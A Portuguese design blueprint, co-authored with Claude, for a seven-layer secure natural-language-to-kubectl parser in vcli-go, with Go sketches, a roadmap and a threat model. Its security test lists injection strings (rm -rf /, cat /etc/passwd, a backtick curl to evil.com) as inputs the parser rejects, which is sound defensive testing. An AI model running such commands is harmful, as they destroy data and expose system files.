# NLP Parser Security-First Blueprint
## vcli-go Natural Language Interface

**Arquiteto:** Juan Carlos (Inspiração: Jesus)  
**Co-Autor:** Claude (GitHub Copilot)  
**Data:** 2025-10-12  
**Versão:** 1.0.0  
**Status:** BLUEPRINT FUNDACIONAL

---

## 🎯 MISSÃO

Implementar parser de linguagem natural em vcli-go que permita comandos no "jeito esquisito" do usuário, com segurança equivalente ou superior ao parser atual do GitHub Copilot CLI, mantendo 100% de aderência à Doutrina MAXIMUS.

**Princípio Fundador:**  
> "Nenhuma confiança implícita. Cada comando em linguagem natural é tratado como vetor de ataque potencial até ser verificado em múltiplas camadas."

---

## 🏛️ AS SETE CAMADAS DE VERIFICAÇÃO
### Doutrina "Guardião da Intenção" v2.0

### 1️⃣ Autenticação: Quem é você?
**Objetivo:** Prova de identidade irrefutável antes de qualquer parsing.

**Implementação:**
- **MFA obrigatório** para sessões interativas
- **Chaves criptográficas** (RSA 4096-bit) para automação
- **Tokens JWT** com expiração curta (15min) e refresh seguro
- **Biometria** opcional (fingerprint, face recognition via OS)

**Fluxo:**
```
User Input → Auth Check → Token Validation → Identity Confirmed → Proceed
                ↓ FAIL
            Reject + Log
```

**Arquivos Go:**
- `internal/auth/mfa.go`
- `internal/auth/jwt.go`
- `internal/auth/keyring.go`

---

### 2️⃣ Autorização: O que você pode fazer?
**Objetivo:** RBAC + Políticas Contextuais Adaptativas (Zero Trust).

**Modelo de Permissões:**
```yaml
roles:
  operator:
    can: [read, list, describe, logs]
    cannot: [delete, exec, apply]
  
  admin:
    can: [all]
    require_approval: [delete namespaces, apply crds]
  
  auditor:
    can: [read, export_logs]
    cannot: [modify]
```

**Contexto Adaptativo:**
- **IP Whitelisting:** Comandos destrutivos bloqueados fora da VPN
- **Horário:** Alterações críticas bloqueadas fora do horário comercial
- **Estado do Sistema:** Rate limit aumentado durante incidentes
- **Histórico Comportamental:** Anomalias escalam requisitos de auth

**Arquivos Go:**
- `internal/authz/rbac.go`
- `internal/authz/context.go`
- `internal/authz/policies.go`

---

### 3️⃣ Sandboxing: Qual o seu raio de ação?
**Objetivo:** Least Privilege - Parser opera com mínimo privilégio necessário.

**Estratégias:**
- **Process Isolation:** Parser roda em goroutine separada com panic recovery
- **Resource Limits:** CPU (1 core), Memory (256MB), Timeout (5s)
- **Filesystem Jail:** Acesso restrito ao workspace do usuário
- **Network Isolation:** Sem acesso direto à internet, apenas via proxy
- **Kubernetes RBAC:** ServiceAccount com permissões limitadas

**Implementação:**
```go
type ParserSandbox struct {
    MaxCPU     time.Duration
    MaxMemory  int64
    Timeout    time.Duration
    AllowedFS  []string
    AllowedNet []string
}

func (s *ParserSandbox) Execute(cmd ParsedCommand) error {
    ctx, cancel := context.WithTimeout(context.Background(), s.Timeout)
    defer cancel()
    
    // Resource monitoring goroutine
    go s.monitorResources(ctx, cmd)
    
    // Execute with limits
    return s.executeIsolated(ctx, cmd)
}
```

**Arquivos Go:**
- `internal/sandbox/isolation.go`
- `internal/sandbox/resources.go`
- `internal/sandbox/monitor.go`

---

### 4️⃣ Validação da Intenção: Você tem certeza?
**Objetivo:** Ciclo de tradução reversa + confirmação explícita (HITL).

**Fluxo de Confirmação:**
```
1. User: "deleta os pods quebrados no namespace production"
   ↓
2. Parser interpreta → AST
   ↓
3. Tradução Reversa:
   "Você está prestes a executar:
    $ kubectl delete pods --field-selector status.phase=Failed -n production
    
    Isso irá remover 14 pods.
    
    [C] Confirmar  [R] Reformular  [X] Cancelar"
   ↓
4. User: [C] → Assinatura Digital (para comandos críticos)
   ↓
5. Execução
```

**Comandos Críticos (requerem assinatura):**
- `delete namespace`
- `apply crds`
- `exec` em containers de produção
- `scale deployment` para 0 réplicas

**Implementação:**
```go
type IntentValidator struct {
    translator *ReverseTranslator
    signer     *CryptoSigner
}

func (v *IntentValidator) Validate(parsed ParsedCommand) error {
    // Reverse translation
    humanReadable := v.translator.ToHumanReadable(parsed)
    
    // Impact analysis
    impact := v.analyzeImpact(parsed)
    
    // Request confirmation
    confirmed := v.requestConfirmation(humanReadable, impact)
    if !confirmed {
        return ErrUserCancelled
    }
    
    // Cryptographic signature for critical commands
    if parsed.IsCritical() {
        signature := v.signer.Sign(parsed)
        if !signature.Valid() {
            return ErrInvalidSignature
        }
    }
    
    return nil
}
```

**Arquivos Go:**
- `internal/intent/validator.go`
- `internal/intent/reverse_translator.go`
- `internal/intent/impact_analyzer.go`
- `internal/crypto/signer.go`

---

### 5️⃣ Controle de Fluxo: Com que frequência?
**Objetivo:** Rate Limiting + Circuit Breakers para prevenir abuso.

**Limites por Tipo de Comando:**
```yaml
rate_limits:
  read_operations:
    requests_per_minute: 100
    burst: 20
  
  write_operations:
    requests_per_minute: 10
    burst: 3
  
  delete_operations:
    requests_per_minute: 3
    burst: 1
    cooldown: 60s
  
  nlp_parsing:
    requests_per_minute: 30
    burst: 5
```

**Circuit Breaker:**
- **Threshold:** 5 erros consecutivos
- **Open State:** 60 segundos
- **Half-Open:** Permite 1 tentativa
- **Recovery:** 3 sucessos consecutivos fecham o circuito

**Implementação:**
```go
type RateLimiter struct {
    limits      map[CommandType]Limit
    breakers    map[CommandType]*CircuitBreaker
    violations  *ViolationTracker
}

func (rl *RateLimiter) Allow(cmd ParsedCommand) error {
    // Check rate limit
    if !rl.limits[cmd.Type].Allow() {
        rl.violations.Record(cmd.User, "rate_limit_exceeded")
        return ErrRateLimitExceeded
    }
    
    // Check circuit breaker
    breaker := rl.breakers[cmd.Type]
    if breaker.State() == Open {
        return ErrCircuitOpen
    }
    
    return nil
}
```

**Arquivos Go:**
- `internal/ratelimit/limiter.go`
- `internal/ratelimit/circuit_breaker.go`
- `internal/ratelimit/violations.go`

---

### 6️⃣ Análise Comportamental: Isso é normal para você?
**Objetivo:** Detectar anomalias e escalar requisitos de segurança em tempo real.

**Métricas Comportamentais:**
- **Padrão Temporal:** Usuário normalmente opera 9h-18h BRT
- **Padrão de Comandos:** 80% read, 15% write, 5% delete
- **Namespaces Frequentes:** `dev`, `staging` (raramente `production`)
- **Vocabulário:** Lista de termos/padrões típicos do usuário

**Detecção de Anomalias:**
```go
type BehaviorAnalyzer struct {
    baseline *UserBaseline
    detector *AnomalyDetector
    scorer   *RiskScorer
}

func (ba *BehaviorAnalyzer) Analyze(cmd ParsedCommand) RiskScore {
    profile := ba.baseline.GetProfile(cmd.User)
    
    anomalies := ba.detector.Detect(cmd, profile)
    
    // Calculate risk score (0-100)
    score := ba.scorer.Calculate(anomalies)
    
    if score > 70 {
        // High risk: Require MFA re-authentication
        ba.escalateAuth(cmd.User)
    } else if score > 40 {
        // Medium risk: Add to watchlist
        ba.addToWatchlist(cmd.User)
    }
    
    return score
}
```

**Ações Automáticas:**
- **Score 0-30:** Normal - nenhuma ação
- **Score 31-60:** Caution - log detalhado
- **Score 61-80:** Warning - re-auth obrigatória
- **Score 81-100:** Critical - bloquear + notificar admin

**Arquivos Go:**
- `internal/behavior/analyzer.go`
- `internal/behavior/baseline.go`
- `internal/behavior/anomaly_detector.go`
- `internal/behavior/risk_scorer.go`

---

### 7️⃣ Auditoria Imutável: O que você fez?
**Objetivo:** Registro inviolável de cada passo para forensics.

**Dados Auditados:**
```json
{
  "timestamp": "2025-10-12T10:30:45.123Z",
  "user": {
    "id": "juan@vertice.dev",
    "ip": "192.168.1.100",
    "auth_method": "mfa+jwt"
  },
  "nlp_input": "deleta os pods quebrados no namespace production",
  "parsed_command": {
    "action": "delete",
    "resource": "pods",
    "filters": ["status.phase=Failed"],
    "namespace": "production"
  },
  "translation_confidence": 0.94,
  "security_checks": {
    "authentication": "pass",
    "authorization": "pass",
    "sandbox": "pass",
    "intent_validation": "pass (confirmed + signed)",
    "rate_limit": "pass",
    "behavior_score": 12
  },
  "execution": {
    "status": "success",
    "pods_deleted": 14,
    "duration_ms": 2341
  },
  "hash": "sha256:a3f5...",
  "signature": "sig:b7c2..."
}
```

**Armazenamento:**
- **Primary:** BadgerDB local (append-only log)
- **Secondary:** Remote syslog (TLS)
- **Compliance:** LGPD-ready (anonimização opcional)

**Tamper Detection:**
- Cada registro tem hash SHA-256 do registro anterior (blockchain-like)
- Assinatura digital com chave privada do sistema

**Implementação:**
```go
type AuditLog struct {
    db        *badger.DB
    signer    *CryptoSigner
    remote    *RemoteSyslog
    lastHash  string
}

func (al *AuditLog) Record(entry AuditEntry) error {
    // Add previous hash (chain)
    entry.PreviousHash = al.lastHash
    
    // Calculate current hash
    entry.Hash = al.calculateHash(entry)
    
    // Sign entry
    entry.Signature = al.signer.Sign(entry)
    
    // Store locally
    if err := al.db.Append(entry); err != nil {
        return err
    }
    
    // Ship to remote (async)
    go al.remote.Send(entry)
    
    al.lastHash = entry.Hash
    return nil
}
```

**Arquivos Go:**
- `internal/audit/logger.go`
- `internal/audit/storage.go`
- `internal/audit/chain.go`
- `internal/audit/remote.go`

---

## 🧠 ARQUITETURA DO PARSER

### Pipeline de Processamento

```
┌─────────────────────────────────────────────────────────────────┐
│                      USER INPUT (NLP)                            │
│  "lista os pods que tão rodando no namespace de dev"             │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 1: AUTENTICAÇÃO                                          │
│  ✓ Validar sessão JWT                                            │
│  ✓ Verificar MFA (se expirado)                                   │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  PRÉ-PROCESSAMENTO                                               │
│  • Normalização (lowercasing, trim)                              │
│  • Tokenização                                                   │
│  • Spell Correction (Levenshtein)                                │
│  • Expansão de abreviações (k8s → kubernetes)                    │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  PARSING SEMÂNTICO                                               │
│  • Intent Classification (ML/Rules hybrid)                       │
│  • Entity Extraction (NER)                                       │
│  • Relationship Mapping                                          │
│  • Ambiguity Resolution                                          │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 2: AUTORIZAÇÃO                                           │
│  ✓ Verificar RBAC                                                │
│  ✓ Avaliar contexto (IP, horário, estado)                        │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CONSTRUÇÃO DO COMANDO                                           │
│  • Geração de AST (Abstract Syntax Tree)                         │
│  • Validação sintática                                           │
│  • Inferência de parâmetros faltantes                            │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 3: SANDBOXING                                            │
│  ✓ Aplicar limites de recursos                                   │
│  ✓ Isolar execução                                               │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 4: VALIDAÇÃO DE INTENÇÃO                                 │
│  • Tradução reversa para linguagem humana                        │
│  • Análise de impacto                                            │
│  • Confirmação do usuário                                        │
│  • Assinatura digital (se crítico)                               │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 5: CONTROLE DE FLUXO                                     │
│  ✓ Verificar rate limit                                          │
│  ✓ Avaliar circuit breaker                                       │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 6: ANÁLISE COMPORTAMENTAL                                │
│  • Calcular risk score                                           │
│  • Detectar anomalias                                            │
│  • Escalar auth se necessário                                    │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  EXECUÇÃO                                                        │
│  $ kubectl get pods -n dev --field-selector status.phase=Running │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│  CAMADA 7: AUDITORIA                                             │
│  ✓ Registrar toda a cadeia                                       │
│  ✓ Calcular hash e assinar                                       │
│  ✓ Enviar para remote log                                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛠️ ESTRUTURA DE CÓDIGO

### Novos Diretórios

```
vcli-go/
├── internal/
│   ├── nlp/                          # Parser NLP core
│   │   ├── parser.go                 # Main parser interface
│   │   ├── tokenizer.go              # Tokenização
│   │   ├── normalizer.go             # Normalização de input
│   │   ├── intent_classifier.go      # Classificação de intenção
│   │   ├── entity_extractor.go       # Extração de entidades (NER)
│   │   ├── command_builder.go        # Construção de comandos
│   │   ├── confidence_scorer.go      # Score de confiança
│   │   └── grammar/                  # Gramáticas e regras
│   │       ├── kubernetes.go         # Gramática K8s
│   │       ├── maximus.go            # Gramática MAXIMUS
│   │       └── common.go             # Gramática comum
│   │
│   ├── auth/                         # CAMADA 1: Autenticação
│   │   ├── mfa.go                    # Multi-factor auth
│   │   ├── jwt.go                    # JWT handling
│   │   ├── keyring.go                # Cryptographic keys
│   │   └── biometric.go              # Biometric auth (optional)
│   │
│   ├── authz/                        # CAMADA 2: Autorização
│   │   ├── rbac.go                   # Role-based access control
│   │   ├── context.go                # Context-aware policies
│   │   ├── policies.go               # Policy engine
│   │   └── models.go                 # Data models
│   │
│   ├── sandbox/                      # CAMADA 3: Sandboxing
│   │   ├── isolation.go              # Process isolation
│   │   ├── resources.go              # Resource limits
│   │   └── monitor.go                # Resource monitoring
│   │
│   ├── intent/                       # CAMADA 4: Validação de Intenção
│   │   ├── validator.go              # Intent validator
│   │   ├── reverse_translator.go    # Tradução reversa
│   │   ├── impact_analyzer.go       # Análise de impacto
│   │   └── confirmation.go           # UI de confirmação
│   │
│   ├── ratelimit/                    # CAMADA 5: Controle de Fluxo
│   │   ├── limiter.go                # Rate limiter
│   │   ├── circuit_breaker.go       # Circuit breaker
│   │   └── violations.go             # Violation tracking
│   │
│   ├── behavior/                     # CAMADA 6: Análise Comportamental
│   │   ├── analyzer.go               # Behavior analyzer
│   │   ├── baseline.go               # User baseline
│   │   ├── anomaly_detector.go      # Anomaly detection
│   │   └── risk_scorer.go            # Risk scoring
│   │
│   ├── audit/                        # CAMADA 7: Auditoria
│   │   ├── logger.go                 # Audit logger
│   │   ├── storage.go                # Local storage (BadgerDB)
│   │   ├── chain.go                  # Blockchain-like chain
│   │   └── remote.go                 # Remote syslog
│   │
│   └── crypto/                       # Criptografia
│       ├── signer.go                 # Digital signatures
│       ├── hasher.go                 # Hashing utilities
│       └── keymanager.go             # Key management
│
├── cmd/
│   └── nlp.go                        # Comando NLP
│
└── test/
    └── nlp/                          # Testes NLP
        ├── parser_test.go
        ├── security_test.go
        ├── e2e_test.go
        └── fixtures/
```

---

## 📊 MODELOS DE DADOS

### ParsedCommand

```go
type ParsedCommand struct {
    // Input original
    RawInput string
    
    // Parsing
    Intent       IntentType
    Action       ActionType
    Resource     ResourceType
    Filters      []Filter
    Namespace    string
    Flags        map[string]string
    Confidence   float64
    
    // Security
    User         User
    SessionID    string
    Timestamp    time.Time
    
    // Classification
    IsCritical   bool
    RiskLevel    RiskLevel
    
    // Metadata
    Tokens       []Token
    Entities     []Entity
    AST          *CommandAST
}
```

### IntentType

```go
type IntentType int

const (
    IntentUnknown IntentType = iota
    IntentList                       // Listar recursos
    IntentDescribe                   // Descrever detalhes
    IntentCreate                     // Criar recursos
    IntentDelete                     // Deletar recursos
    IntentUpdate                     // Atualizar recursos
    IntentScale                      // Escalar recursos
    IntentLogs                       // Ver logs
    IntentExec                       // Executar comando
    IntentApply                      // Aplicar manifesto
)
```

### Entity

```go
type Entity struct {
    Type     EntityType
    Value    string
    Start    int
    End      int
    Metadata map[string]interface{}
}

type EntityType int

const (
    EntityResource EntityType = iota  // pod, deployment, service
    EntityNamespace                   // namespace
    EntityLabel                       // label selector
    EntityField                       // field selector
    EntityNumber                      // réplicas, limites
    EntityTime                        // tempo, duração
)
```

### AuditEntry

```go
type AuditEntry struct {
    ID            string
    Timestamp     time.Time
    
    // User context
    User          User
    SessionID     string
    IP            string
    AuthMethod    string
    
    // Command
    RawInput      string
    ParsedCommand ParsedCommand
    Confidence    float64
    
    // Security checks
    AuthResult    CheckResult
    AuthzResult   CheckResult
    SandboxResult CheckResult
    IntentResult  CheckResult
    RateLimitResult CheckResult
    BehaviorScore   int
    
    // Execution
    ExecutionStatus  string
    ExecutionOutput  string
    ExecutionDuration time.Duration
    ErrorMessage      string
    
    // Integrity
    PreviousHash string
    Hash         string
    Signature    string
}
```

---

## 🎓 ESTRATÉGIAS DE PARSING

### 1. Classificação de Intenção (Intent Classification)

**Abordagem Híbrida: Rules + ML**

#### Regras Explícitas (80% dos casos)
```go
var intentRules = []IntentRule{
    {
        Pattern:  regexp.MustCompile(`(?i)(list|lista|mostra|ver).*(pod|deployment|service)`),
        Intent:   IntentList,
        Priority: 100,
    },
    {
        Pattern:  regexp.MustCompile(`(?i)(delete|deleta|remove).*(pod|deployment)`),
        Intent:   IntentDelete,
        Priority: 100,
    },
    {
        Pattern:  regexp.MustCompile(`(?i)(create|cria|add).*(deployment|service)`),
        Intent:   IntentCreate,
        Priority: 100,
    },
    {
        Pattern:  regexp.MustCompile(`(?i)(scale|escala).*(deployment|sts)`),
        Intent:   IntentScale,
        Priority: 100,
    },
}
```

#### ML Fallback (20% dos casos complexos)
- **Modelo:** Naive Bayes ou Logistic Regression
- **Features:** TF-IDF de bigramas
- **Treinamento:** Logs históricos de comandos
- **Atualização:** Continuous learning com feedback do usuário

---

### 2. Extração de Entidades (NER)

#### Entidades Kubernetes
```go
type K8sEntityExtractor struct {
    resources   map[string]ResourceType
    namespaces  []string
    labelKeys   []string
}

func (e *K8sEntityExtractor) Extract(tokens []Token) []Entity {
    entities := []Entity{}
    
    // Extract resources
    for _, token := range tokens {
        if resourceType, found := e.resources[token.Value]; found {
            entities = append(entities, Entity{
                Type:  EntityResource,
                Value: token.Value,
                Start: token.Start,
                End:   token.End,
                Metadata: map[string]interface{}{
                    "resource_type": resourceType,
                },
            })
        }
    }
    
    // Extract namespaces
    for i, token := range tokens {
        if token.Value == "namespace" || token.Value == "ns" {
            if i+1 < len(tokens) {
                entities = append(entities, Entity{
                    Type:  EntityNamespace,
                    Value: tokens[i+1].Value,
                })
            }
        }
    }
    
    // Extract labels
    for _, token := range tokens {
        if strings.Contains(token.Value, "=") {
            parts := strings.Split(token.Value, "=")
            if len(parts) == 2 {
                entities = append(entities, Entity{
                    Type: EntityLabel,
                    Value: token.Value,
                    Metadata: map[string]interface{}{
                        "key":   parts[0],
                        "value": parts[1],
                    },
                })
            }
        }
    }
    
    return entities
}
```

---

### 3. Normalização e Correção

#### Spell Correction (Levenshtein Distance)
```go
func (n *Normalizer) CorrectSpelling(word string) string {
    minDistance := 999
    bestMatch := word
    
    // Check against known vocabulary
    for _, knownWord := range n.vocabulary {
        distance := levenshtein.ComputeDistance(word, knownWord)
        if distance < minDistance && distance <= 2 {
            minDistance = distance
            bestMatch = knownWord
        }
    }
    
    return bestMatch
}
```

#### Expansão de Abreviações
```go
var abbreviations = map[string]string{
    "k8s":   "kubernetes",
    "ns":    "namespace",
    "svc":   "service",
    "deploy": "deployment",
    "sts":   "statefulset",
    "ds":    "daemonset",
    "cm":    "configmap",
    "pv":    "persistentvolume",
    "pvc":   "persistentvolumeclaim",
}
```

---

### 4. Inferência de Parâmetros

#### Smart Defaults
```go
func (cb *CommandBuilder) InferParameters(parsed *ParsedCommand) error {
    // Namespace default
    if parsed.Namespace == "" {
        parsed.Namespace = cb.getDefaultNamespace()
    }
    
    // Output format
    if _, hasFormat := parsed.Flags["output"]; !hasFormat {
        if parsed.Intent == IntentList {
            parsed.Flags["output"] = "table"
        }
    }
    
    // Field selector inference
    if parsed.Intent == IntentList && len(parsed.Filters) == 0 {
        // "lista pods rodando" → adicionar filter status.phase=Running
        if cb.hasToken(parsed.Tokens, "rodando", "running") {
            parsed.Filters = append(parsed.Filters, Filter{
                Type:  FilterField,
                Field: "status.phase",
                Value: "Running",
            })
        }
    }
    
    return nil
}
```

---

## 🧪 ESTRATÉGIA DE TESTES

### 1. Unit Tests
```go
func TestIntentClassification(t *testing.T) {
    tests := []struct {
        input    string
        expected IntentType
    }{
        {"lista os pods", IntentList},
        {"deleta o deployment nginx", IntentDelete},
        {"escala o deployment api para 5 réplicas", IntentScale},
        {"mostra os logs do pod frontend", IntentLogs},
    }
    
    classifier := NewIntentClassifier()
    for _, tt := range tests {
        result := classifier.Classify(tt.input)
        assert.Equal(t, tt.expected, result.Intent)
    }
}
```

### 2. Security Tests
```go
func TestInjectionPrevention(t *testing.T) {
    malicious := []string{
        "delete pods && rm -rf /",
        "list pods; cat /etc/passwd",
        "get pods $(whoami)",
        "describe pod `curl http://evil.com`",
    }
    
    parser := NewSecureParser()
    for _, input := range malicious {
        _, err := parser.Parse(input)
        assert.Error(t, err)
        assert.Contains(t, err.Error(), "injection attempt detected")
    }
}
```

### 3. E2E Tests
```go
func TestE2E_DeletePodsWorkflow(t *testing.T) {
    // Setup
    ctx := setupTestContext(t)
    defer ctx.Teardown()
    
    // Authenticate
    ctx.AuthenticateUser("test-user", "mfa-token")
    
    // Execute NLP command
    result := ctx.ExecuteNLP("deleta os pods quebrados no namespace test")
    
    // Assertions
    assert.True(t, result.RequiredConfirmation)
    assert.Equal(t, IntentDelete, result.ParsedCommand.Intent)
    assert.Equal(t, "test", result.ParsedCommand.Namespace)
    
    // Confirm
    ctx.ConfirmIntent(result.ConfirmationID)
    
    // Verify execution
    assert.True(t, result.Executed)
    assert.Len(t, result.DeletedPods, 3)
}
```

---

## 📈 MÉTRICAS DE SUCESSO

### Performance
- **Latência de Parsing:** <100ms (p95)
- **Latência Total (com confirmação):** <2s (p95)
- **Throughput:** >50 comandos/s
- **Acurácia de Intent:** >95%
- **Acurácia de Entity Extraction:** >98%

### Segurança
- **False Positives (bloqueios incorretos):** <1%
- **False Negatives (ataques não detectados):** 0%
- **MFA Compliance:** 100%
- **Audit Log Completeness:** 100%
- **Tamper Detection Success:** 100%

### Usabilidade
- **User Satisfaction:** >4.5/5
- **Confirmation Rate:** >90% (usuários confirmam comandos)
- **Retry Rate:** <5% (baixa necessidade de reformulação)
- **Adoption Rate:** >80% (usuários preferem NLP vs CLI tradicional)

---

## 🗓️ ROADMAP DE IMPLEMENTAÇÃO

### Fase 1: Fundação (Sprint 1-2)
**Objetivo:** Parser básico funcional com segurança mínima

- [ ] Setup estrutura de diretórios
- [ ] Implementar tokenizer e normalizer
- [ ] Criar gramáticas básicas (K8s list, describe, delete)
- [ ] Implementar intent classifier (rules-based)
- [ ] Implementar entity extractor
- [ ] Integrar com shell existente
- [ ] Testes unitários básicos

**Deliverable:** Parser reconhece e executa 10 comandos básicos

---

### Fase 2: Segurança Core (Sprint 3-4)
**Objetivo:** Implementar Camadas 1-4 (Auth, Authz, Sandbox, Intent)

- [ ] CAMADA 1: Autenticação
  - [ ] JWT integration
  - [ ] MFA support
  - [ ] Keyring management
- [ ] CAMADA 2: Autorização
  - [ ] RBAC engine
  - [ ] Context-aware policies
- [ ] CAMADA 3: Sandboxing
  - [ ] Resource limits
  - [ ] Process isolation
- [ ] CAMADA 4: Validação de Intenção
  - [ ] Reverse translator
  - [ ] Impact analyzer
  - [ ] Confirmation UI
  - [ ] Crypto signer
- [ ] Testes de segurança

**Deliverable:** Sistema funciona com todas as 4 primeiras camadas de segurança

---

### Fase 3: Resiliência e Observabilidade (Sprint 5-6)
**Objetivo:** Implementar Camadas 5-7 (Rate Limit, Behavior, Audit)

- [ ] CAMADA 5: Controle de Fluxo
  - [ ] Rate limiter
  - [ ] Circuit breaker
  - [ ] Violation tracker
- [ ] CAMADA 6: Análise Comportamental
  - [ ] User baseline
  - [ ] Anomaly detector
  - [ ] Risk scorer
- [ ] CAMADA 7: Auditoria
  - [ ] BadgerDB integration
  - [ ] Blockchain-like chain
  - [ ] Remote syslog
- [ ] Métricas Prometheus
- [ ] Dashboards Grafana

**Deliverable:** Sistema completo com todas as 7 camadas operacionais

---

### Fase 4: Inteligência Avançada (Sprint 7-8)
**Objetivo:** ML, continuous learning, expansão de cobertura

- [ ] Treinar modelo ML para intent classification
- [ ] Implementar continuous learning pipeline
- [ ] Expandir gramáticas (todos os recursos K8s)
- [ ] Suporte para comandos compostos
- [ ] Context awareness (histórico de sessão)
- [ ] Sugestões proativas

**Deliverable:** Parser alcança >95% acurácia em todos os comandos K8s

---

### Fase 5: Expansão e Polimento (Sprint 9-10)
**Objetivo:** Além de K8s, UX refinement, documentação

- [ ] Gramáticas MAXIMUS
- [ ] Gramáticas Threat Hunting
- [ ] Gramáticas Data Governance
- [ ] Multi-language support (EN + PT-BR)
- [ ] Voice input (opcional)
- [ ] Documentação completa
- [ ] Tutorial interativo
- [ ] Performance optimization

**Deliverable:** Sistema production-ready, multi-domínio, documentado

---

## 📚 DEPENDÊNCIAS GO

### Novas Dependências

```go.mod
require (
    // NLP
    github.com/kljensen/snowball v0.10.0          // Stemming
    github.com/pemistahl/lingua-go v1.4.0         // Language detection
    
    // Security
    github.com/golang-jwt/jwt/v5 v5.3.0          // JWT (já existe)
    golang.org/x/crypto v0.32.0                   // Crypto primitives
    
    // Rate Limiting
    golang.org/x/time v0.5.0                      // Rate limiter
    github.com/sony/gobreaker v1.0.0             // Circuit breaker
    
    // Storage
    github.com/dgraph-io/badger/v4 v4.8.0        // Já existe
    
    // Monitoring
    github.com/prometheus/client_golang v1.23.2   // Já existe
)
```

---

## 🔐 THREAT MODEL

### Vetores de Ataque Mitigados

1. **Command Injection**
   - Mitigação: Parsing estruturado, sem shell execution direta
   
2. **SQL Injection** (se usar SQL no futuro)
   - Mitigação: Prepared statements, ORM

3. **Privilege Escalation**
   - Mitigação: RBAC estrito, least privilege, sandboxing

4. **Session Hijacking**
   - Mitigação: JWT com curta expiração, MFA obrigatória

5. **Denial of Service**
   - Mitigação: Rate limiting, circuit breakers, resource limits

6. **Replay Attacks**
   - Mitigação: Nonces, timestamps, signatures

7. **Social Engineering**
   - Mitigação: Reverse translation, confirmação explícita

8. **Insider Threats**
   - Mitigação: Audit log imutável, behavior analysis

9. **Supply Chain Attacks**
   - Mitigação: Dependency scanning, SBOM, reproducible builds

10. **Zero-Day Exploits**
    - Mitigação: Defense in depth (7 camadas), fail-secure

---

## 🏆 DIFERENCIAIS vs. Outras Soluções

### vs. GitHub Copilot CLI
- ✅ **Mesmo nível de parsing** (até superior com behavior analysis)
- ✅ **Segurança superior** (7 camadas vs. 3-4 do Copilot)
- ✅ **Offline-first** (funciona sem cloud)
- ✅ **Open Source** (auditável, sem vendor lock-in)
- ✅ **Domain-specific** (K8s + MAXIMUS + Threat Hunting)

### vs. kubectl + AI assistants
- ✅ **Integrado** (não precisa copiar/colar)
- ✅ **Context-aware** (sabe estado do cluster)
- ✅ **Safe by default** (confirmação obrigatória para ações críticas)
- ✅ **Auditable** (every action logged and signed)

### vs. ChatGPT + terminal
- ✅ **Latência** (<2s vs. 10-30s)
- ✅ **Privacy** (dados não saem da máquina)
- ✅ **Reliability** (funciona offline)
- ✅ **Cost** (zero custo por request)

---

## 🎯 EXEMPLOS DE USO

### Caso 1: Operação Básica
```
User: lista os pods rodando no namespace production

Parser:
  Intent: LIST
  Resource: pods
  Namespace: production
  Filters: status.phase=Running
  Confidence: 0.98

Tradução Reversa:
  $ kubectl get pods -n production --field-selector status.phase=Running

Execução: ✅ (nenhuma confirmação necessária - comando read-only)
```

### Caso 2: Operação Crítica
```
User: deleta todos os pods com label app=cache no namespace staging

Parser:
  Intent: DELETE
  Resource: pods
  Namespace: staging
  Labels: app=cache
  Confidence: 0.96
  IsCritical: true

Tradução Reversa:
  $ kubectl delete pods -n staging -l app=cache
  
  ⚠️  ATENÇÃO: Comando DESTRUTIVO
  Isso irá deletar 8 pods:
    - cache-7d9f8b-abc12
    - cache-7d9f8b-def34
    ...
  
  Este ambiente (staging) tem 3 serviços dependentes.
  
  Comportamento: Score 15/100 (Normal)
  
  [C] Confirmar + Assinar  [R] Reformular  [X] Cancelar

User: [C] + assinatura digital

Execução: ✅ (após confirmação e assinatura)
Audit: Registrado com hash e signature
```

### Caso 3: Anomalia Detectada
```
User: deleta o namespace production

Parser:
  Intent: DELETE
  Resource: namespace
  Namespace: production
  Confidence: 0.99
  IsCritical: true

Behavior Analyzer:
  Risk Score: 89/100 (CRITICAL)
  Anomalias detectadas:
    - Usuário nunca deletou namespaces antes
    - Horário incomum (03:47 AM)
    - IP diferente (não é VPN corporativa)
  
  🚨 ACESSO BLOQUEADO
  
  Re-autenticação MFA obrigatória.
  Admin notificado.
  
  Após re-auth, confirmação + assinatura + aprovação de 2º admin necessários.

Execução: ❌ (bloqueado até aprovação multi-party)
```

---

## 📖 CONCLUSÃO

Este blueprint estabelece as fundações para um parser de linguagem natural **primoroso, seguro e production-ready** que:

1. **Compreende o "jeito esquisito"** do usuário através de NLP robusto
2. **Protege contra todos os vetores** de ataque conhecidos via 7 camadas
3. **Mantém auditoria imutável** para compliance e forensics
4. **Adapta-se ao comportamento** do usuário em tempo real
5. **Opera offline** sem dependências de cloud
6. **É extensível** para novos domínios além de K8s

**Próximos Passos:**
1. Review deste blueprint com a equipe
2. Aprovação do roadmap de 10 sprints
3. Início da implementação: Fase 1 (Sprint 1-2)

---

**Glória a Deus. Transformamos dias em minutos.**

**Arquiteto:** Juan Carlos  
**Co-Autor:** Claude  
**Status:** PRONTO PARA IMPLEMENTAÇÃO  
**Data:** 2025-10-12
